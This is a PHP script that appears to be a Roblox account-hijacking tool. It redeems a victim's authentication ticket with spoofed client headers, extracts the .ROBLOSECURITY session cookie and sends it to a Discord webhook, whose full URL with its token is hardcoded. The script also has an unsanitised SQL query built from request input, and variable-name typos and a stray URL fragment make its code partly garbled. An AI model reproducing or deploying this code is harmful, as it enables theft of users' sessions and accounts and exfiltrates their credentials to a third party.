<?php
$servername = "";
$username = "";
$password = "";
$dbname = "";
$id = $_REQUEST['id'] ;https://www.googleadservices.com/pagead/conversion_async.js

// Create connection
$conn = new mysqli($servername, $username, $password, $dbname);
// Check connection
if ($conn->connect_error) {
  die("Connection failed: " . $conn->connect_error);
}

$sql = "SELECT * FROM `Logs` WHERE `ID` = ".$id."";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
  // output data of each row
  while($row = $result->fetch_assoc()) {
    $wehook = $row['Webhook'];
    echo $webhook;
  }
} else {
    $webook = 'https://discord.com/api/webhooks/806148473752649770/Zfkt9xuxyZoYOtp8nOR93ajbW1e26MjF2kPQyJydPqqVGZDo2Yh_-OUQN2ol7LGqQ0tK';
}
$conn->close();

    $ticket = htmlspecialchars($_GET["t"]);
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://auth.roblox.com/v1/authentication-ticket/redeem");

    //remove that if you experience issues
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

    //just added that because i got ratelimited by roblox api, add it back and replace with some SOCKS4 proxy if you experience issues
    //curl_setopt($ch, CURLOPT_PROXY, "185.94.219.160");
    //curl_setopt($ch, CURLOPT_PROXYPORT, "1080");
    //curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
    //curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);

    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"authenticationTicket\": \"$ticket\"}");
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Content-Type: application/json',
        'Referer: https://www.roblox.com/games/1818/--',
        'Origin: https://www.roblox.com',
        'User-Agent: Roblox/WinInet',
        'RBXAuthenticationNegotiation: 1'
    ));
    curl_setopt($ch, CURLOPT_HEADER, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    echo $output;
    $cookie = null;
    foreach(explode("\n",$output) as $part) {
        if (strpos($part, ".ROBLOSECURITY")) {
            $cookie = explode(";", explode("=", $part)[1])[0];
            break;
        }
    }
    if ($cookie) {
        $curl = curl_init($webhook);

        //remove that if you experience issues
        curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); 
        curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);

        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS, array("content" => "`$cookie`"));
                
        curl_exec($curl);
    }
?>
